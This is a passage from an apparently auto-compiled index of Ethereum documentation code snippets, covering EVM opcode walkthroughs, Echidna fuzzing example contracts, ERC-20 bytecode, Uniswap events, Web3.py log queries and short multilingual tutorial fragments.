success/failure))) 0x80 Storage[3]-as-address \nB5 | RETURNDATACOPY     | RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address                          \n```\n\nLANGUAGE: evm\nCODE:\n```\nB6 | DUP2               | (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address                              \nB7 | DUP1               | (((call success/failure))) (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address   \nB8 | ISZERO             | (((did the call fail))) (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address      \nB9 | PUSH2 0x00c0       | 0xC0 (((did the call fail))) (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address \nBC | JUMPI              | (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address                              \nBD | DUP2               | RETURNDATASIZE (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address               \nBE | DUP5               | 0x80 RETURNDATASIZE (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address          \nBF | RETURN             |                                                                                                                              \n```\n\nLANGUAGE: evm\nCODE:\n```\nC0 | JUMPDEST           | (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address                     \nC1 | DUP2               | RETURNDATASIZE (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address      \nC2 | DUP5               | 0x80 RETURNDATASIZE (((call success/failure))) RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address \nC3 | REVERT             |                                                                                                                     \n```\n\n----------------------------------------\n\nTITLE: Importing ERC-165 Interface for Token Standard Detection\nDESCRIPTION: Imports the IERC165 interface which allows contracts to declare which interfaces they support, enabling other contracts to check compatibility.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { IERC165 } from \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\n```\n\n----------------------------------------\n\nTITLE: Magic Value Detection Contract in Solidity\nDESCRIPTION: A Solidity contract that requires specific magic values to change a state variable. This demonstrates a scenario where fuzzers might struggle but can be improved with corpus techniques.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  bool value_found = false;\n  function magic(uint magic_1, uint magic_2, uint magic_3, uint magic_4) public {\n    require(magic_1 == 42);\n    require(magic_2 == 129);\n    require(magic_3 == magic_4+333);\n    value_found = true;\n    return;\n  }\n\n  function echidna_magic_values() public returns (bool) {\n    return !value_found;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: DELEGATECALL Opcode (F4) Memory Operations\nDESCRIPTION: The DELEGATECALL opcode (F4) calls another contract in the context of the caller, preserving msg.sender and msg.value. It stores return data in the specified memory location.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Liquidity Provider Events in Uniswap V2\nDESCRIPTION: Defines events for liquidity provision (Mint) and withdrawal (Burn), tracking the amounts of each token and the involved addresses.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Mint(address indexed sender, uint amount0, uint amount1);\nevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n```\n\n----------------------------------------\n\nTITLE: React Component Imports for Ethereum dApp\nDESCRIPTION: Initial imports for a React component that interacts with an Ethereum smart contract, including React hooks and utility functions for wallet connection and contract interaction.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nimport React from \"react\"\nimport { useEffect, useState } from \"react\"\nimport {\n  helloWorldContract,\n  connectWallet,\n  updateMessage,\n  loadCurrentMessage,\n  getCurrentWalletConnected,\n} from \"./util/interact.js\"\n\nimport alchemylogo from \"./alchemylogo.svg\"\n```\n\n----------------------------------------\n\nTITLE: Ethereum ERC20 Token Contract Bytecode\nDESCRIPTION: The compiled bytecode for an ERC20 token contract implementation. This represents the executable code that is deployed to the Ethereum blockchain.\n\nLANGUAGE: bytecode\nCODE:\n```\n00008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: Przykład adresu Bitcoin w kontekście identyfikacji w systemach zdecentralizowanych\nDESCRIPTION: Fragment przedstawia przykładowy adres Bitcoin jako identyfikator pseudorandomowy, który jest używany w zdecentralizowanych protokołach. Podkreśla to potrzebę bardziej przyjaznych dla użytkownika systemów identyfikacji, takich jak Namecoin.\n\nLANGUAGE: markdown\nCODE:\n```\n`1LW79wp5ZBqaHW1jL5TCiBCrhQYtHagUWy`\n```\n\n----------------------------------------\n\nTITLE: Converting Shares to Assets in ERC-4626 Vault (Solidity)\nDESCRIPTION: This function calculates how many assets would be exchanged by the vault for the provided amount of shares.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction convertToAssets(uint256 shares) public view returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Executando o script para visualizar a ABI do contrato\nDESCRIPTION: Comando para executar o script mint-nft.js que exibe a ABI do contrato no console para verificação.\n\nLANGUAGE: shell\nCODE:\n```\nnode scripts/mint-nft.js\n```\n\n----------------------------------------\n\nTITLE: Generalized Formula for Deflation Gas Price\nDESCRIPTION: A generalized formula that expresses the required gas price as a function of daily ETH issuance (X), allowing calculation for any issuance amount. This formula simplifies to X/108.\n\nLANGUAGE: math\nCODE:\n```\nY = (X(10^3)/(7200 * 15)) = X/108\nf(X) = X/108\n```\n\n----------------------------------------\n\nTITLE: Calculating Total Gas Fee in Ethereum Transactions\nDESCRIPTION: Formula showing how the total gas fee is calculated by multiplying the units of gas used by the sum of base fee and priority fee. This example illustrates how a 21,000 gas ETH transfer with a 10 gwei base fee and a 2 gwei tip would cost 0.000252 ETH in total.\n\nLANGUAGE: markdown\nCODE:\n```\n`units of gas used * (base fee + priority fee)`\n```\n\n----------------------------------------\n\nTITLE: Gas Consumption Testing Contract\nDESCRIPTION: A contract with an expensive function that can consume a lot of gas when specific parameters are provided, used to demonstrate gas consumption testing with Echidna.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  uint state;\n\n  function expensive(uint8 times) internal {\n    for(uint8 i=0; i < times; i++)\n      state = state + i;\n  }\n\n  function f(uint x, uint y, uint8 times) public {\n    if (x == 42 && y == 123)\n      expensive(times);\n    else\n      state = 0;\n  }\n\n  function echidna_test() public returns (bool) {\n    return true;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Opcodes Added in Byzantium Fork\nDESCRIPTION: This highlights two key opcodes added in the Byzantium fork: the REVERT opcode which allows for clean contract failure states, and the STATICCALL opcode which enables non-state-changing calls to other contracts.\n\nLANGUAGE: solidity\nCODE:\n```\nREVERT\n```\n\nLANGUAGE: solidity\nCODE:\n```\nSTATICCALL\n```\n\n----------------------------------------\n\nTITLE: Retrieving CryptoKitties Birth Events from Ethereum using Web3.py\nDESCRIPTION: This snippet demonstrates how to query recent birth events for CryptoKitties NFTs using Web3.py. It gets logs from recent blocks, filters by the CryptoKitties contract address and the specific birth event signature, then processes the event data into a more usable format.\n\nLANGUAGE: python\nCODE:\n```\nbirth_logs = w3.eth.get_logs({\n    \"fromBlock\": w3.eth.block_number - 120,\n    \"address\": w3.to_checksum_address(ck_token_addr),\n    \"topics\": [ck_event_signatures[1]]\n})\n\nrecent_births = [get_event_data(w3.codec, ck_extra_events_abi[1], log)[\"args\"] for log in birth_logs]\n```\n\n----------------------------------------\n\nTITLE: Interaction Script Output\nDESCRIPTION: Expected console output when running the interaction script, showing the initial message, update process, and the new message after the update.\n\nLANGUAGE: bash\nCODE:\n```\nThe message is: Hello World!\nUpdating the message...\nThe new message is: This is the new message.\n```\n\n----------------------------------------\n\nTITLE: Bridge Authorization Modifier and ERC-165 Interface Support\nDESCRIPTION: Implements an access control modifier that restricts minting and burning to the L2 bridge only, and adds ERC-165 interface detection support for IL2StandardERC20.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier onlyL2Bridge() {\n    require(msg.sender == l2Bridge, \"Only L2 Bridge can mint and burn\");\n    _;\n}\n\n\n// slither-disable-next-line external-function\nfunction supportsInterface(bytes4 _interfaceId) public pure returns (bool) {\n    bytes4 firstSupportedInterface = bytes4(keccak256(\"supportsInterface(bytes4)\")); // ERC165\n    bytes4 secondSupportedInterface = IL2StandardERC20.l1Token.selector ^\n        IL2StandardERC20.mint.selector ^\n        IL2StandardERC20.burn.selector;\n    return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;\n}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Initialization with Opcodes\nDESCRIPTION: Ethereum Virtual Machine (EVM) opcodes for initializing an ERC20 token contract. This bytecode handles token creation, setting token name, symbol, decimals, and minting initial supply to the deployer address.\n\nLANGUAGE: opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xE5 SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP PUSH1 0x12 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH3 0x116 CALLER DUP3 PUSH3 0x11D PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x438 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH3 0x1C1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x1D5 PUSH1 0x0 DUP4 DUP4 PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1F1 DUP2 PUSH1 0x2 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH3 0x24F DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH3 0x37F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x3CC JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x3FD JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x3FD JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x3FC JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x3DF JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x40C SWAP2 SWAP1 PUSH3 0x410 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x435 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x431 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x417 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x10F1 DUP1 PUSH3 0x448 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1\n```\n\n----------------------------------------\n\nTITLE: Solidity Contract with Array Operations for Gas Testing\nDESCRIPTION: A sample Solidity contract with array operations that can be used to demonstrate gas consumption patterns. It includes functions to push, pop, and clear an array, as well as a check function that loops through the array with nested loops.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  address [] addrs;\n  function push(address a) public {\n    addrs.push(a);\n  }\n  function pop() public {\n    addrs.pop();\n  }\n  function clear() public{\n    addrs.length = 0;\n  }\n  function check() public{\n    for(uint256 i = 0; i < addrs.length; i++)\n      for(uint256 j = i+1; j < addrs.length; j++)\n        if (addrs[i] == addrs[j])\n          addrs[j] = address(0x0);\n  }\n  function echidna_test() public returns (bool) {\n      return true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Definiendo las direcciones para realizar transferencias\nDESCRIPTION: Configuración de las direcciones de remitente y destinatario para las operaciones con el token DAI. El remitente es la dirección desbloqueada en ganache-cli.\n\nLANGUAGE: javascript\nCODE:\n```\nconst senderAddress = \"0x4d10ae710Bd8D1C31bd7465c8CBC3add6F279E81\"\nconst receiverAddress = \"0x19dE91Af973F404EDF5B4c093983a7c6E3EC8ccE\"\n```\n\n----------------------------------------\n\nTITLE: Syncing Fork with Latest Changes in Shell\nDESCRIPTION: Set of commands to synchronize your forked repository with the latest changes from the main ethereum.org repository. This prevents merge conflicts when contributing.\n\nLANGUAGE: shell\nCODE:\n```\ngit checkout dev\ngit fetch upstream\ngit merge upstream/dev\n```\n\n----------------------------------------\n\nTITLE: EtherSplitter Smart Contract Implementation in Solidity\nDESCRIPTION: A simple Solidity smart contract that splits Ether evenly between two predefined receivers. It requires the amount to be even and emits Transfer events after each transfer.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.0;\n\ncontract EtherSplitter {\n    address payable receiver1;\n    address payable receiver2;\n\n    event Transfer(address from, address to, uint256 amount);\n\n    constructor(address payable _address1, address payable _address2) public {\n        receiver1 = _address1;\n        receiver2 = _address2;\n    }\n\n    function split() public payable {\n        require(msg.value % 2 == 0, 'Uneven wei amount not allowed');\n        receiver1.transfer(msg.value / 2);\n        emit Transfer(msg.sender, receiver1, msg.value / 2);\n        receiver2.transfer(msg.value / 2);\n        emit Transfer(msg.sender, receiver2, msg.value / 2);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: EtherSplitter Smart Contract Implementation in Solidity\nDESCRIPTION: A simple Solidity smart contract that splits Ether evenly between two predefined receivers. It requires the amount to be even and emits Transfer events after each transfer.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.0;\n\ncontract EtherSplitter {\n    address payable receiver1;\n    address payable receiver2;\n\n    event Transfer(address from, address to, uint256 amount);\n\n    constructor(address payable _address1, address payable _address2) public {\n        receiver1 = _address1;\n        receiver2 = _address2;\n    }\n\n    function split() public payable {\n        require(msg.value % 2 == 0, 'Uneven wei amount not allowed');\n        receiver1.transfer(msg.value / 2);\n        emit Transfer(msg.sender, receiver1, msg.value / 2);\n     